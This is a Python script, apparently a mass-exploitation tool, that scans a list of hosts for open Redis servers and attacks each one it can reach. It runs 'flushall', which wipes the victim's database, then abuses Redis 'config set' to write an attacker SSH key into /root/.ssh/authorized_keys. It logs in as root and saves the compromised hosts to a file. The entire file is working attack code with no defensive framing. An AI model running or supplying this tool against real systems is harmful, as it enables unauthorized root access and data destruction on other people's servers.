import subprocess 
import socket
import paramiko
import os

input_file=raw_input("> Targets Filename: ")
output_file=raw_input("> Output Filename: ")

def run_command(command):
  try:
	out_bytes = subprocess.check_output(command, shell = True)
	# out_text = out_bytes.decode('utf-8')
  except subprocess.CalledProcessError as e:
	out_bytes = e.output       # Output generated before error
	code      = e.returncode   # Return code
  return out_bytes

def gererateRSAKey(passphrase):
  run_command('rm -rf ./id_rsa ./id_rsa.pub')
  print run_command('ssh-keygen -t rsa -f ./id_rsa -P {0}'.format(passphrase))
  run_command('(echo "\\n\\n"; cat ./id_rsa.pub; echo "\\n\\n") > foo.txt')
  
def attack(target):
  print '>> Attack the target: ' + target
  print '>> Flush all the old data...'
  print run_command('redis-cli -h {0} flushall'.format(target))
  print '>> Push key data to the memory...'
  print run_command('cat ./foo.txt | redis-cli -h {0} -x set crackit'.format(target))
  print '>> Set the /root/.ssh/ to current directory...'
  print run_command('redis-cli -h {0} config set dir /root/.ssh/'.format(target))
  print '>> Get the current dir...'
  print run_command('redis-cli -h {0} config get dir'.format(target)) 
  print '>> Set key data to authorized_keys database key..'
  print run_command('redis-cli -h {0} config set dbfilename "authorized_keys"'.format(target))
  print '>> Write key data to authorized_keys file...'
  print run_command('redis-cli -h {0} save'.format(target))

def findPromisingTarget(targets):
  promisingTargets = []
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  for target in targets:
	command = 'redis-cli -h {0} config set dir /root/.ssh/'.format(target)
	if run_command(command).find('OK') != -1:
	  print '______________________________________________________'
	  print 'Successfully access /root/.ssh/ on ' + target
	  print 'Test the SSH port of ' + target
	  try:
		s.connect((target, 22))
		print "Success!!!"
		s.close()
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		promisingTargets.append(target)
		print "Number of promising target: " + str(len(promisingTargets))
	  except socket.error as e:
		print "Error on connect: %s" % e
	  print '______________________________________________________'
  s.close()
  return promisingTargets

def SSHConnect(target, passphrase):
  ssh = paramiko.SSHClient()
  ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
  try:
	ssh.connect(target, username='root', password=passphrase, key_filename='./id_rsa')
	stdin, stdout, stderr = ssh.exec_command('ls /')
	print stdout.readlines()
	ssh.close()
	return True
  except Exception as e:
	print e
	return False
  
def writeToFile(filename, content):
  target = open(filename, 'a')
  target.write(content)
  target.write("\n")
  target.close()

def checkports(targets):
	targets_alive=[]
	for target in targets:
		try:
			print ">> Checking %s"%(target)
			s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.settimeout(1)
			s.connect((target, 6379))
			s.close()
			targets_alive.append(target)
			print "[+] %s"%(target)
		except:
			print "[-] %s"%(target)
			pass
	return targets_alive

def main():
  print '> Generating SSH Key Files'
  passphrase = raw_input('Enter a file passphrase for SSH key: ')
  gererateRSAKey(passphrase)
  print '> Checking targets w/ 6379 TCP OPEN'
  targets = [line.rstrip('\r\n') for line in open(input_file)]
  targets_alive = checkports(targets)
  os.system("clear")
  
  print '> Finding Promising Targets'
  promisingTargets = findPromisingTarget(targets_alive)
  os.system("clear")

  print '> Attack Promising Targets'
  pwnedTargets = []
  for promisingTarget in promisingTargets:
	print '______________________________________________________'
	attack(promisingTarget)
	print 'Try to connect to target using SSH connection'
	if SSHConnect(promisingTarget, passphrase) == True:
	  pwnedTargets.append(promisingTarget)
	  writeToFile(output_file, promisingTarget)
	#print '______________________________________________________'

  print '\n_________________________________SUMMARY_________________________________'
  print 'TOTAL CHECKED TARGETS: {0}'.format(len(targets))
  print 'TOTAL PROMISING TARGETS: {0}'.format(len(promisingTargets))
  print 'TOTAL PWNED TARGETS: {0}'.format(len(pwnedTargets))
  print 'LIST OF ALL PWNED TARGETS:'
  for pwnedTarget in pwnedTargets:
	print pwnedTarget
  print '_________________________________________________________________________'
  print 'Pwned Targets were written in %s'%(output_file)
  print '_________________________________________________________________________'
if __name__ == "__main__":
  main()